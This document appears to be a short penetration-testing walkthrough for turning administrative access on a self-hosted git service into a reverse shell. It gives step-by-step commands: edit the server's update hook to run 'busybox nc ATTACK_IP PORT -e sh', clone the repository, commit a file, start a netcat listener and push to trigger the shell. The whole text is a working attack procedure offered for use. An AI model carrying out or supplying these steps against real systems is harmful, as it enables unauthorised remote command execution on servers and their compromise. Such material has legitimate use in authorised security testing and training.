# Git Hooks

## Requirements:

Administrative access to a self-hosted git service

## Steps:

### 1) Create a repository

### 2) Go to the newly created repository, then click 

    Settings -> Git Hooks

### 3) Modify the update Git Hook (example) by adding a reverse shell one-liner, then click "Update Hook"

    # --- Command line
    busybox nc ATTACK_IP PORT -e sh

### 4) Clone the repository on the attacker's machine (It may ask for user credentials. Use the administrative credentials to authenticate to the remote repository)

    git clone http://domain.local:8000/repoowner/pwned.git

### 5) Create a README.md file

    cd pwned
    touch README.md

### 6) Initiate the existing repository and the added README.md to the repository

    git init
    git add README.md

### 7) Add a commit

    git commit -m "first commit"

### 8) Setup your listener

    nc -lvnp PORT

### 9) Push to the created repository to catch the reverse shell

    git push origin master

